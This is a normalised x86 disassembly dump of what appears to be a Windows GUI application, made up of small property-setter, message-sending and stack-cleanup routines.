add [ edx + ecx * 8 ] ah
dec eax
add [ edx + ecx * 8 + 0x48 ] ch
add [ eax - 0x4bffb736 ] bh
enter 0x48 0x74

sub_456100
sbb al 0xeb
inc edx
add [ ebx + ecx * 8 ] ch
dec eax
add [ eax - 0x15 ] dl
inc edx
add ah ah

sub_456166
dec eax
add [ esi + ebx * 8 + 0x45 ] bl
add [ eax - 0x3bffbaec ] ch

sub_456172
dec eax
add [ edx + ecx * 8 ] ah
dec eax
add [ edx + ecx * 8 + 0x48 ] ch
add [ eax - 0x4bffb736 ] bh
enter 0x48 0x74

sub_456376
jmp r-xdata
inc edi
dec [ edx + ebp * 8 + 0x45 ]
add [ edx + ebp * 8 - 0x15cbffbb ] bh
inc ebp
add ah cl
jmp sub_4563ce
sub_45839d
[ edi + edi * 8 + 0x134ffab ]
sub_458fa4
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_459282
inc ebp
add [ esp + esi * 8 + 0x65b40045 ] ch
inc edx
add [ esi ] bh
inc edx
add [ edi + esi * 8 + 0x68d80045 ] al
inc edx
add ah dl
hlt
sub_4597e2
jmp sub_448b58
sub_4597e9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459872
jmp sub_448b58
sub_459879
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459880
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax ebx
call sub_492060
pop ebx
retn
sub_459898
push ebx
mov ebx eax
mov eax ebx
call sub_495d94
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax ebx
call sub_492060
pop ebx
retn
sub_4598b8
push esi
mov esi eax
mov eax esi
call sub_494a34
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_459994
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_48df68
pop esi
pop ebx
retn
sub_459a97
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_459aa0
jmp sub_448b58
j_sub_459a97
jmp sub_459a97
sub_459aa7
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_459b27
jmp sub_448b58
sub_459b2e
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_459e42
jmp sub_448b58
sub_459e49
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459f03
jmp sub_448b58
sub_459f0a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a018
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_490858
mov eax ebx
mov si 0xffc6
call sub_4483f8
pop esi
pop ebx
retn
sub_45a0e2
jmp sub_448b58
sub_45a148
cmp dl [ eax + 0x1ac ]
je r-xdata
retn
mov [ eax + 0x1ac ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45a160
cmp dl [ eax + 0x1c0 ]
je r-xdata
retn
mov [ eax + 0x1c0 ] dl
mov [ eax + 0x1ad ] 0x0
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45a180
push esi
mov esi eax
cmp dl [ esi + 0x1ad ]
je r-xdata
pop esi
retn
mov [ esi + 0x1ad ] dl
mov [ esi + 0x1c0 ] 0x0
mov eax esi
mov si 0xffc6
call sub_4483f8
sub_45a1a8
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_45a1b4
mov [ eax + 0x1a8 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_42e354
sub_45a1c8
cmp edx [ eax + 0x1b8 ]
je r-xdata
retn
mov [ eax + 0x1b8 ] edx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45a1e0
cmp dl [ eax + 0x1be ]
je r-xdata
retn
mov [ eax + 0x1be ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45a240
cmp dl [ eax + 0x1bc ]
je r-xdata
retn
mov [ eax + 0x1bc ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45a2b4
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov eax ebx
mov si 0xffc6
call sub_4483f8
pop esi
pop ebx
retn
sub_45a2d0
push esi
mov esi eax
mov eax esi
call sub_490260
mov eax esi
mov si 0xffc6
call sub_4483f8
pop esi
retn
sub_45a382
jmp sub_448b58
sub_45a389
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45a4d8
cmp dl [ eax + 0x260 ]
je r-xdata
retn
mov [ eax + 0x260 ] dl
call sub_492ec4
sub_45a4ec
cmp dl [ eax + 0x26d ]
je r-xdata
retn
mov [ eax + 0x26d ] dl
call sub_45ac18
sub_45a500
push ebx
mov ebx eax
cmp dl [ ebx + 0x268 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x268 ] dl
mov eax ebx
call sub_45ac18
mov eax ebx
call sub_492ec4
sub_45a524
cmp dl [ eax + 0x271 ]
je r-xdata
retn
mov [ eax + 0x271 ] dl
call sub_492ec4
sub_45a574
cmp dl [ eax + 0x26f ]
je r-xdata
retn
mov [ eax + 0x26f ] dl
call sub_492ec4
sub_45a5b8
cmp dl [ eax + 0x270 ]
je r-xdata
retn
mov [ eax + 0x270 ] dl
call sub_492ec4
sub_45a7ec
push ebx
call sub_496868
mov ebx eax
xor eax eax
call sub_449db8
push eax
push ebx
call SetWindowTextW
pop ebx
retn
sub_45a804
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_45a8ac
jmp sub_448b58
sub_45a8b3
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a951
jmp sub_448b58
sub_45ab03
jmp sub_448b58
sub_45acca
jmp sub_448b58
sub_45ad38
push ebx
mov ebx eax
mov eax ebx
call sub_48db88
cmp [ ebx + 0x27a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x27c ]
call [ ebx + 0x278 ]
sub_45ae9c
push esi
mov esi eax
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ esi + 0x272 ] 0x0
jne r-xdata
mov eax esi
mov si 0xffb0
call sub_4483f8
sub_45afcc
movzx eax [ eax + 0x260 ]
retn
sub_45b1ed
jmp sub_448b58
sub_45b1f4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b29c
mov eax [ eax + 0x1c ]
mov edx [ eax ]
call [ edx + 0xf8 ]
retn
sub_45b2f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x1c ]
call sub_48df68
pop esi
pop ebx
retn
sub_45b3fe
jmp sub_448b58
sub_45b405
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b603
jmp sub_448b58
sub_45b60a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b6ac
push ebx
mov ebx eax
mov eax ebx
call sub_490858
xor edx edx
mov eax ebx
call sub_45a604
pop ebx
retn
sub_45b6c4
push esi
mov esi eax
mov eax [ esi + 0x290 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45b6d4
cmp dl [ eax + 0x294 ]
je r-xdata
retn
mov [ eax + 0x294 ] dl
call sub_492ec4
sub_45b6e8
cmp dl [ eax + 0x295 ]
je r-xdata
retn
mov [ eax + 0x295 ] dl
call sub_492ec4
sub_45b730
call sub_4959d0
retn
sub_45b7c0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_45b85e
jmp sub_448b58
sub_45b865
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45b954
jmp sub_448b58
sub_45b95b
pop esi
pop ecx
pop ebp
retn
sub_45ba3f
jmp sub_448b58
sub_45ba46
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45babc
jmp sub_448b58
sub_45bac3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45bc28
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_48d3e8
mov eax [ ebx + 0x29c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x2b8 ] 0xffffffff
pop ebx
retn
sub_45bc78
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_45bda8
test edx edx
jle r-xdata
retn
mov [ eax + 0x298 ] edx
call sub_492ec4
sub_45bde4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45bdf0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45bdfc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45be2c
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_48f2b0
sub_45c010
push ebx
mov ecx [ eax + 0x2b0 ]
push ecx
mov ecx [ eax + 0x2a4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
pop ebx
retn
sub_45c028
cmp dl [ eax + 0x2d4 ]
je r-xdata
retn
mov [ eax + 0x2d4 ] dl
call sub_492ec4
sub_45c32d
jmp sub_4488a4
sub_45c332
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45c654
jmp sub_448b58
sub_45c65b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45c664
push ebx
mov ebx eax
mov eax ebx
call sub_48db88
cmp [ ebx + 0x27a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x27c ]
call [ ebx + 0x278 ]
sub_45c731
jmp sub_448b58
sub_45c738
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45c744
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45c7cc
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_45c922
jmp sub_448b58
sub_45c96c
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xe0 ]
retn
sub_45c9f7
jmp sub_448b58
sub_45c9fe
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ca30
mov edx [ eax ]
call [ edx + 0x11c ]
retn
sub_45cae1
jmp sub_448b58
sub_45cae8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45cbc8
cmp dl [ eax + 0x2d5 ]
je r-xdata
retn
mov [ eax + 0x2d5 ] dl
call sub_492ec4
sub_45cc1c
movzx edx [ eax + 0x2d6 ]
add dl 0xfd
sub dl 0x2
jae sub_45cc32
mov eax [ eax + 0x298 ]
retn
sub_45cc32
push 0x0
xor ecx ecx
mov edx 0x154
call sub_48f2b0
retn
sub_45d003
jmp sub_448b58
sub_45d00a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d405
jmp sub_448b58
sub_45d40c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d64a
jmp sub_448b58
sub_45d651
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d65c
push ebx
cmp [ eax + 0x2ea ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2ec ]
call [ ebx + 0x2e8 ]
sub_45d858
mov eax [ eax + 0x29c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_45d864
mov eax [ r-xdata ]
retn
sub_45da9c
jmp sub_448b58
sub_45db5e
jmp sub_448b58
sub_45dc0c
mov eax [ r-xdata ]
retn
sub_45dc14
xor eax eax
retn
sub_45dc38
retn
sub_45dd6c
cmp dl [ eax + 0x261 ]
je r-xdata
retn
mov [ eax + 0x261 ] dl
call sub_492ec4
sub_45ddc8
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_45dfec
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_45e278
xor eax eax
retn
sub_45e3b0
cmp edx [ eax + 0x278 ]
je r-xdata
retn
mov [ eax + 0x278 ] edx
test edx edx
je r-xdata
xchg edx eax
call sub_42e354
sub_45e5a8
mov eax [ eax + 0x290 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_45e7b9
jmp sub_448b58
sub_45e90c
mov eax [ r-xdata ]
retn
sub_45e948
push ebx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
sub_45ea34
push esi
mov esi eax
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov eax esi
mov si 0xffeb
call sub_4483f8
sub_45eb36
lea eax [ ebp - 0x8 ]
call j_sub_449348
retn
sub_45eb3f
jmp sub_448b58
j_sub_45eb36
jmp sub_45eb36
sub_45eb46
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_45ed88
push ebx
mov ebx eax
mov eax ebx
call sub_48db88
mov eax ebx
call sub_48fba8
pop ebx
retn
sub_45ed9c
cmp [ eax + 0x26a ] 0x1
sete al
retn
sub_45eda8
cmp dl [ eax + 0x268 ]
je r-xdata
retn
mov [ eax + 0x268 ] dl
call sub_492ec4
sub_45edbc
test dl dl
je r-xdata
xor edx edx
call sub_45edd0
retn
mov dl 0x1
call sub_45edd0
retn
sub_45eea8
push esi
mov esi eax
mov eax esi
call sub_494a34
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
retn
sub_45eec0
call sub_492ec4
retn
sub_45ef56
jmp sub_448b58
sub_45ef5d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ef64
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xe4 ]
sub_45efd4
movzx eax [ eax + 0x269 ]
retn
sub_45f008
cmp dl [ eax + 0x268 ]
je r-xdata
retn
mov [ eax + 0x268 ] dl
call sub_492ec4
sub_45f1e8
call sub_492ec4
retn
sub_45f272
jmp sub_448b58
sub_45f279
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_45f2ac
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18b
mov eax [ ebx + 0x1c ]
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_45f38d
jmp sub_448b58
sub_45f394
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f420
jmp sub_448b58
sub_45f427
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f55c
jmp sub_448b58
sub_45f563
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f5f1
jmp sub_448b58
sub_45f5f8
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f600
push esi
mov eax [ eax + 0x1c ]
mov si 0xffab
call sub_4483f8
pop esi
retn
sub_45f73f
jmp sub_448b58
sub_45f764
jmp sub_448b58
sub_45f76b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f774
push esi
mov eax [ eax + 0x1c ]
mov si 0xffac
call sub_4483f8
pop esi
retn
sub_45f8d7
jmp sub_448b58
sub_45f8f4
jmp sub_448b58
sub_45f8fb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45faad
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
sub_45fabb
jmp sub_448b58
j_sub_45faad
jmp sub_45faad
sub_45fac2
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45fb10
push esi
mov si 0xffae
call sub_4483f8
pop esi
retn
sub_45fb1c
push esi
mov esi eax
mov eax esi
mov si 0xffad
call sub_4483f8
pop esi
retn
sub_45fb74
push esi
mov esi eax
mov eax edx
mov edx [ esi + 0x270 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_45fb88
mov eax [ eax + 0x270 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_45fcf3
jmp sub_448b58
sub_45fcfa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fe60
movzx edx [ eax + 0x290 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ eax + 0x270 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ eax + 0x26c ]
retn
sub_45fe84
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x190
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_45feec
cmp dl [ eax + 0x293 ]
je r-xdata
retn
mov [ eax + 0x293 ] dl
call sub_492ec4
sub_45ff00
push esi
mov esi eax
cmp dl [ esi + 0x291 ]
je r-xdata
pop esi
retn
mov [ esi + 0x291 ] dl
mov eax esi
call sub_492ec4
mov eax esi
mov edx [ eax ]
call [ edx + 0x58 ]
sub_45ff60
push ecx
mov ecx 0x198
xchg edx ecx
call sub_48f2f8
retn
sub_45ff70
cmp edx [ eax + 0x288 ]
je r-xdata
retn
test edx edx
jle r-xdata
mov [ eax + 0x288 ] edx
call sub_492ec4
sub_45ff88
test edx edx
jge r-xdata
cmp edx [ eax + 0x294 ]
je r-xdata
xor edx edx
retn
mov [ eax + 0x294 ] edx
call sub_492ec4
sub_45ffa4
cmp dl [ eax + 0x260 ]
je r-xdata
retn
mov [ eax + 0x260 ] dl
call sub_492ec4
sub_4600b8
movzx ecx [ eax + 0x290 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x292 ]
je r-xdata
mov [ eax + 0x292 ] dl
call sub_492ec4
sub_460118
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_460201
jmp sub_448b58
sub_460208
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4602c7
jmp sub_448b58
sub_4602ce
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4602d4
cmp dl [ eax + 0x27c ]
je r-xdata
retn
mov [ eax + 0x27c ] dl
call sub_492ec4
sub_4608e3
jmp sub_448b58
sub_460a50
jmp sub_448b58
sub_460a57
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460a90
push ebx
mov ebx eax
mov eax ebx
call sub_494a34
mov eax ebx
call sub_45fd70
pop ebx
retn
sub_460c41
jmp sub_448b58
sub_460c48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_460c54
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_461092
jmp sub_448b58
sub_461099
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4610a0
push esi
mov esi eax
mov eax [ esi + 0x270 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_461185
jmp sub_448b58
sub_46118c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461194
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_461204
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x193
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_461271
jmp sub_448b58
sub_461278
pop ebp
retn
sub_46127c
sub [ rw-data ] 0x1
retn
sub_4612b5
jmp sub_448b58
sub_4612bc
pop ebp
retn
sub_4612c0
sub [ rw-data ] 0x1
retn
sub_46223f
jmp [ eax + eax ]
sub_4622c4
mov eax [ esp + 0x8 ]
retn
sub_4622cc
push ebx
mov ebx eax
call sub_4622c4
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
jmp sub_448c38
sub_4622e8
pop ebx
retn
sub_462553
jmp sub_448b58
sub_46255a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46268e
jmp sub_448b58
sub_462695
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_462808
jmp sub_448b58
sub_46280f
movzx eax [ ebp - 0xe ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46282c
push ebx
mov eax [ rw-data ]
call sub_424d1c
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_424cf0
mov eax ebx
pop ebx
retn
sub_4629bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4483ac
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4629d8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
movzx eax [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_463168
jmp sub_448b58
sub_46316f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_463272
jmp sub_448b58
sub_463279
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463749
jmp sub_448b58
sub_463750
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_463993
jmp sub_448b58
sub_46399a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46431c
jmp sub_448b58
sub_464323
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4647cc
jmp sub_448b58
sub_464c96
jmp sub_448b58
sub_464c9d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46514c
jmp sub_448b58
sub_465632
jmp sub_448b58
sub_465639
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465c39
jmp sub_448b58
sub_465c40
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465eb2
jmp sub_448b58
sub_465eb9
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_465ecb
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x44 ]
je r-xdata
retn
mov [ eax + 0x44 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_46607c
mov eax [ r-xdata ]
retn
sub_4660b8
cmp dx [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4660cc
cmp dl [ eax + 0x3a ]
je r-xdata
retn
mov [ eax + 0x3a ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4660dc
cmp edx [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4660ec
or edx 0xffffffff
mov ecx [ eax + 0x60 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_4663f4
mov edx eax
sub_466184
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4483ac
mov edx esi
call sub_466104
pop esi
pop ebx
retn
sub_466200
mov edx [ eax + 0x40 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_4663f4
push esi
or ecx 0xffffffff
mov esi [ eax + 0x58 ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_424744
mov ecx eax
sub_4665e8
mov edx [ eax + 0x60 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x6c ] 0x0
je r-xdata
mov eax [ edx + 0x6c ]
retn
sub_466650
jmp r-xdata
mov edx [ eax + 0x60 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x6c ]
retn
sub_466a00
cmp edx [ eax + 0x78 ]
jne r-xdata
retn
call sub_466a34
sub_466a34
mov edx sub_466a0c
mov ecx eax
mov eax [ eax + 0x64 ]
xchg edx eax
call sub_4628b0
retn
sub_466c7b
jmp sub_448b58
sub_466c82
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4671bb
jmp sub_448b58
sub_4671f2
jmp sub_448b58
sub_4671f9
movzx eax [ ebp - 0x25 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4673a4
cmp dl [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4674b0
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_462d48
retn
sub_4674f8
push ebp
mov ebp esp
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ esi + 0x34 ]
mov si 0xfffd
call sub_4483f8
pop esi
pop ebp
retn 0x8
sub_467518
mov eax [ eax + 0x34 ]
call sub_46342c
retn
sub_467524
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_4483f8
pop esi
retn
sub_467538
push ebx
mov ecx sub_466a0c
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x64 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4628b0
pop ebx
retn
sub_467770
cmp [ eax + 0x3c ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x44 ] 0x0
jne r-xdata
xor eax eax
retn
sub_467876
jmp sub_448b58
sub_467893
jmp sub_448b58
sub_46789a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4678c4
lea eax [ ebp - 0x28 ]
mov edx 0x2
call j_sub_44936c
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_4678bd
jmp sub_448b58
sub_4678c4
pop ebx
mov esp ebp
pop ebp
retn
sub_467a18
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x60 ]
dec edx
sub_467b4e
jmp sub_4488a4
sub_467c24
jmp sub_448b58
sub_467c4f
jmp sub_448b58
sub_467c70
movzx eax [ eax + 0x3d ]
xor al 0x1
retn
sub_467d71
jmp sub_448b58
sub_467ed4
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
call sub_467538
sub_467f58
jmp sub_448b58
sub_467f9c
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_467fb4
push ebx
mov ebx eax
mov eax ebx
call sub_42e6f8
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_468006
add [ eax ] al
cmp edx [ eax + 0x44 ]
jne r-xdata
retn
call sub_467538
sub_46807c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_46823d
jmp sub_448b58
sub_468244
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46848c
cmp dl [ eax + 0x3d ]
je r-xdata
retn
mov [ eax + 0x3d ] dl
call sub_46849c
sub_4684f0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x37 ]
movzx eax [ eax + rw-data ]
retn
sub_468500
and edx 0x7f
movzx edx [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x37 ] dl
retn
sub_468514
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x38 ]
movzx eax [ eax + rw-data ]
retn
sub_468524
and edx 0x7f
movzx edx [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x38 ] dl
retn
sub_468538
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageW
sub_4685b4
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_463280
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_463280
retn
sub_4685d0
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x64 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_463280
sub_468618
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_467518
retn
mov eax edx
retn
sub_468652
jmp sub_4488a4
sub_468657
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
pop ecx
